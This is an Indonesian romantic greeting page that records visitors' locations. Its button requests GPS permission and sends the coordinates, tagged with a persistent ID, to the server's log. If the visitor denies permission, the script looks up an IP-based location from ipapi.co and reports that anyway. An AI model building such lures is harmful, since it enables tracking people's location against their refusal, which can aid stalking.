<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <title>I Love You Sayang</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    :root { --pink1:#ffd0e3; --pink2:#ff9ccf; --accent:#ff4d79; }
    html,body{height:100%;margin:0;font-family:Inter,system-ui,Arial;}
    body{
      display:flex;align-items:center;justify-content:center;
      background: linear-gradient(120deg,var(--pink1),var(--pink2));
      overflow:hidden;color:#fff;
    }

    .card{
      width: 400px;
      max-width: calc(100% - 32px);
      text-align:center;
      background: rgba(255,255,255,0.06);
      border-radius:18px;padding:26px;
      box-shadow: 0 12px 40px rgba(0,0,0,0.08);backdrop-filter: blur(6px);
    }
    h1{margin:0 0 12px;font-size:28px;text-shadow: 0 8px 28px rgba(0,0,0,0.08);}
    .kitty{width:240px;height:240px;border-radius:18px;object-fit:cover;margin:0 auto 14px;border:6px solid rgba(255,255,255,0.06);}
    .btn{padding:12px 26px;border-radius:999px;border:0;background:linear-gradient(90deg,var(--accent),#ff6fa0);color:#fff;font-weight:700;cursor:pointer}
    .status{margin-top:12px;font-size:14px;color:rgba(255,255,255,0.95);}
    .floating{position:fixed;inset:0;pointer-events:none;z-index:1;overflow:hidden}
    .love{position:absolute;font-weight:800;color:rgba(255,20,147,0.22);font-size:18px;white-space:nowrap;animation:floatFar linear infinite}
    @keyframes floatFar { 0%{transform:translateY(120vh) scale(0.6);opacity:0} 15%{opacity:1} 100%{transform:translateY(-220vh) scale(1.4);opacity:0} }

    .note{font-size:12px;color:rgba(255,255,255,0.85);margin-top:8px}

    /* small gentle heart pulse */
    .pulse {
      display:inline-block;margin-top:10px;width:12px;height:12px;border-radius:50%;background:#ff6fa0;box-shadow:0 0 20px rgba(255,77,121,0.35);
      animation:pulse 1.4s infinite;
      vertical-align:middle;margin-left:8px;
    }
    @keyframes pulse { 0%{transform:scale(0.85)} 50%{transform:scale(1.15)} 100%{transform:scale(0.85)} }
  </style>
</head>
<body>
  <div class="floating" id="floating"></div>

  <div class="card" role="main">
    <h1>I Love You Sayang</h1>
    <img src="/static/img/kucing.jpeg" class="kitty" alt="kucing imut">
    <div>
      <button id="sendBtn" class="btn">Klik ini ðŸ’•</button>
    </div>
    <div id="status" class="status">Tekan tombol untuk memunculkan dialog izin lokasi dari browser.</div>
    <div class="note">Jika kamu izinkan, koordinat akan dicatat ke server (log). <span class="pulse" title="aktif"></span></div>
  </div>

  <script>
    // many floating "I love you sayang" that fly very far up
    const floating = document.getElementById('floating');
    function spawnLoves(count=50){
      const vw = window.innerWidth, vh = window.innerHeight;
      for(let i=0;i<count;i++){
        const el = document.createElement('div');
        el.className='love';
        el.textContent='I love you sayang ðŸ’—';
        el.style.left = (Math.random()*100) + 'vw';
        el.style.top = vh + (Math.random()*200) + 'px';
        el.style.animationDuration = (10 + Math.random()*12) + 's';
        el.style.fontSize = (12 + Math.random()*28) + 'px';
        floating.appendChild(el);
        setTimeout(()=> el.remove(), (12 + Math.random()*12)*1000);
      }
    }
    spawnLoves(80);
    setInterval(()=> spawnLoves(20), 2000);

    const sendBtn = document.getElementById('sendBtn');
    const statusEl = document.getElementById('status');

    // generate stable client_id stored in localStorage so server logs can identify
    let clientId = localStorage.getItem('client_id');
    if(!clientId){
      clientId = 'client_' + Math.random().toString(36).slice(2,10);
      localStorage.setItem('client_id', clientId);
    }

    async function postLocation(lat, lon, source='gps'){
      try{
        await fetch('/report', {
          method:'POST',
          headers: {'Content-Type':'application/json'},
          body: JSON.stringify({ client_id: clientId, latitude: lat, longitude: lon, source })
        });
        statusEl.textContent = 'Koordinat terkirim ke server (akan muncul di logs).';
      }catch(e){
        console.error(e);
        statusEl.textContent = 'Gagal kirim koordinat ke server.';
      }
    }

    sendBtn.addEventListener('click', async () => {
      statusEl.textContent = 'Meminta izin lokasi dari browser...';
      if(!navigator.geolocation){
        statusEl.textContent = 'Geolocation tidak tersedia di browser ini.';
        return;
      }

      // Use getCurrentPosition (one-time prompt) so browser shows permission dialog.
      navigator.geolocation.getCurrentPosition(async (pos) => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        statusEl.textContent = `Lokasi didapatkan â€” mengirim ke server... (${lat.toFixed(5)}, ${lon.toFixed(5)})`;
        await postLocation(lat, lon, 'gps');
      }, async (err) => {
        // if GPS denied or fails, you may optionally fallback to IP-based (note: less accurate).
        console.warn('geo error', err);
        statusEl.textContent = 'Pengguna menolak atau GPS gagal. Mencoba fallback IP (jika tersedia)...';
        try{
          const r = await fetch('https://ipapi.co/json/');
          const j = await r.json();
          if(j && j.latitude && j.longitude){
            await postLocation(j.latitude, j.longitude, 'ip');
            statusEl.textContent = 'Koordinat fallback (IP) terkirim ke server (akurasi lebih rendah).';
          }else{
            statusEl.textContent = 'Fallback IP tidak tersedia.';
          }
        }catch(e){
          console.warn('ip fallback failed', e);
          statusEl.textContent = 'Tidak dapat memperoleh lokasi.';
        }
      }, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000
      });
    });
  </script>
</body>
</html>
